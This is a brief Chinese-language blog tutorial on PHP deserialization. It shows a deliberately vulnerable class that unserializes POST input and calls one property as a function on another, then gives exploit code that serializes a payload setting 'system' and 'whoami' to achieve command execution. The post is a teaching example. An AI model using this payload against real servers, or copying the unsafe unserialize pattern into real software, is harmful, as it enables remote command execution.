---
title: 简单的PHP反序列化
tags: PHP
categories: 技术分享
abbrlink: f8e3d21b
date: 2019-10-16 22:28:30
updated: 2019-10-16 22:28:30
---

### 源代码

```
<?php

class test{
    public $xcx;
    public $miku;

    function __destruct(){
       $a = $this->xcx;
       $a($this->miku);
    }
}
unserialize($_POST['qq']);
?>
```

### 代码分析

代码上的 function __destruct是析构函数，会在 销毁一个类之前执行的一些操作或完成一些功能 。

因上面将xcx赋值给a，再将miku放进a执行，可以根据这个构造出命令执行的序列化

### 利用代码

```
<?php

class test{
    public $xcx = 'system';
    public $miku = 'whoami';

    function __destruct(){
       $a = $this->xcx;
       $a($this->miku);
    }

}
$b = new test();
echo serialize($b);
?>
```

将输出的值以POST形式传参，会返回whoami的结果